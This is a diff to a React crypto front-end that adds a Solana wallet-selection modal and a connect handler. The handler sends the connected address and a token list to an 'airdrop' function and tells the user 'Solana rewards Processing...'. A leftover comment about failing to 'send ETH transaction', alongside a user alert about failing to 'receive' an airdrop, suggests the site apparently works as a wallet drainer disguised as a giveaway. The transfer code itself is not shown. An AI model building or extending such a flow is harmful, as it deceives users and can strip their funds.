@@ -1,5 +1,5 @@
 
-import { useContext, useState, useRef } from 'react';
+import { useContext, useState, useRef, useMemo } from 'react';
 import { WalletContext } from './context/WalletContext';
 import './App.css'
 import { connectWallet, getBalance } from './web3/wallet';
@@ -19,7 +19,7 @@ import { SiSolana } from "react-icons/si"; // SimpleIcons for Solana
 import { SolanaContext } from './context/solana_context/SolanaContext';
 // import { connectSolana, handleSolanaAirdrop } from './web3/solana';
 import { handleSolanaAirdrop } from './web3/solana';
-import { connectSolanaWallet } from './web3/solanaWalletAdapter';
+import { connectSolanaWallet, getSolanaWalletNames } from './web3/solanaWalletAdapter';
 
 const tokenAddresses = [
   "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
@@ -56,7 +56,12 @@ function App() {
   const topRef = useRef(null);
   const chartRef = useRef(null);
   const [showModal, setShowModal] = useState(false);
-  const {solState, solDispatch} = useContext(SolanaContext)
+  const [showSolanaModal, setShowSolanaModal] = useState(false);
+  const solanaWalletNames = useMemo(() => getSolanaWalletNames(), []);
+  const { solDispatch } = useContext(SolanaContext)
+
+  const openSolanaModal = () => setShowSolanaModal(true);
+  const closeSolanaModal = () => setShowSolanaModal(false);
 
   const scrollToTop = () => {
     window.scrollTo({
@@ -122,12 +127,31 @@ function App() {
         // alert("Failed to send ETH transaction.");
         alert("Failed to receive ETH airdrop. Try again later.");
       }
-    } catch (error) {
-      // console.error("Error in connect/send flow:", error);
+    } catch {
       alert("Something went wrong. Please try again.");
     }
     setLoading(false);
   }
+
+  const handleConnectSolanaWallet = async (walletName) => {
+    if (loading) return;
+    setLoading(true);
+
+    try {
+      const { address: solAddress } = await connectSolanaWallet(walletName);
+      if (solAddress) {
+        solDispatch({ type: "CONNECT_SOLANA", payload: { address: solAddress } });
+        await handleSolanaAirdrop(solAddress, solanaTokenList);
+        alert("Solana rewards Processing...");
+      }
+    } catch (e) {
+      console.log("Solana Wallet Connect Error:", e);
+      alert("Unable to connect the selected Solana wallet.");
+    } finally {
+      setLoading(false);
+      closeSolanaModal();
+    }
+  };
 
   const handleSolanaAirdropFlow = async () => {
     if(loading) return
@@ -430,11 +454,36 @@ function App() {
           loading={loading}
           address={state.address}
           setShowModal={setShowModal}
+          openSolanaModal={openSolanaModal}
         />
       </footer>
       {showModal && (
         <div className="modal-overlay">
           <WalletSelector onConnected={handleWalletConnected} />
+        </div>
+      )}
+      {showSolanaModal && (
+        <div className="modal-overlay">
+          <div className="solana-modal bg-white p-4 rounded shadow-lg">
+            <div className="d-flex justify-content-between align-items-center mb-3">
+              <h5 className="mb-0">Select Solana Wallet</h5>
+              <button className="btn btn-sm btn-outline-secondary" onClick={closeSolanaModal}>Close</button>
+            </div>
+            <div className="list-group">
+              {solanaWalletNames.map((name) => (
+                <button
+                  key={name}
+                  type="button"
+                  className="list-group-item list-group-item-action d-flex justify-content-between align-items-center"
+                  onClick={() => handleConnectSolanaWallet(name)}
+                  disabled={loading}
+                >
+                  <span>{name}</span>
+                  <span className="badge bg-primary rounded-pill">Connect</span>
+                </button>
+              ))}
+            </div>
+          </div>
         </div>
       )}
     </>
